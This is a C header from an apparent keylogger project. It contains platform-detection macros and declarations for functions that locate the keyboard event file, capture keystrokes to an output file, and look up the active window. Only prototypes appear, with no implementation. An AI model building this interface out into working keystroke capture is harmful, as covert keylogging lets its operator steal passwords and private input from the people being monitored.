//
// Created by mallo on 13/12/2022.
//

/**
 * Determination a platform of an operation system
 * Fully supported supported ony GNU GCC/G++, partially on Clang/LLVM
 */

#if defined(_WIN32)
#define PLATFORM_WINDOWS "windows" // Windows
#define PLATFORM_NAME "windows"
#elif defined(_WIN64)
#define PLATFORM_WINDOWS "windows" // Windows
    #define PLATFORM_NAME "windows"
#elif defined(__CYGWIN__) && !defined(_WIN32)
#define PLATFORM_WINDOWS "windows" // Windows (Cygwin POSIX under Microsoft Window)
    #define PLATFORM_NAME "windows"
#elif defined(__ANDROID__)
#define PLATFORM_ANDROID "android" // Android (implies Linux, so it must come first)
    #define PLATFORM_NAME "android"
#elif defined(__linux__)
#define PLATFORM_LINUX "linux" // Debian, Ubuntu, Gentoo, Fedora, openSUSE, RedHat, Centos and other
    #define PLATFORM_NAME "linux"
#elif defined(__unix__) || !defined(__APPLE__) && defined(__MACH__)
#include <sys/param.h>
    #if defined(BSD)
        #define PLATFORM_BSD "bsd" // FreeBSD, NetBSD, OpenBSD, DragonFly BSD
        #define PLATFORM_NAME "bsd"
    #endif
#elif defined(__hpux)
#define PLATFORM_HP_UX "hp-ux" // HP-UX
    #define PLATFORM_NAME "hp-ux"
#elif defined(_AIX)
#define PLATFORM_AIX "aix" // IBM AIX
    #define PLATFORM_NAME "aix"
#elif defined(__APPLE__) && defined(__MACH__) // Apple OSX and iOS (Darwin)
#include <TargetConditionals.h>
    #if TARGET_IPHONE_SIMULATOR == 1
        #define PLATFORM_IOS "ios" // Apple iOS
        #define PLATFORM_NAME "ios"
    #elif TARGET_OS_IPHONE == 1
        #define PLATFORM_IOS "ios" // Apple iOS
        #define PLATFORM_NAME "ios"
    #elif TARGET_OS_MAC == 1
        #define PLATFORM_OSX "osx" // Apple OSX
        #define PLATFORM_NAME "osx"
    #endif
#elif defined(__sun) && defined(__SVR4)
#define PLATFORM_SOLARIS "solaris" // Oracle Solaris, Open Indiana
    #define PLATFORM_NAME "solaris"
#else
#define PLATFORM_NULL NULL
#define PLATFORM_NAME NULL
#endif

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <dirent.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

/**
 * Tries to find the filepath of a connected keyboard
 * \return malloc allocated filepath of keyboard, or NULL if none could be
 *         detected
 */
char *get_keyboard_event_file(void);

/**
 * Captures keystrokes by reading from the keyboard resource and writing to
 * the writeout file.
 *
 * \param keyboard The file descriptor for the keyboard input file
 * \param writeout The file descriptor to write keystrokes out to
 */
void keylogger(int keyboard, FILE* writeout);

void convert(int keycode);

void searchActiveWindow(void);

#endif //UNIVERSALKEYLOGGER_KEYLOGGER_H
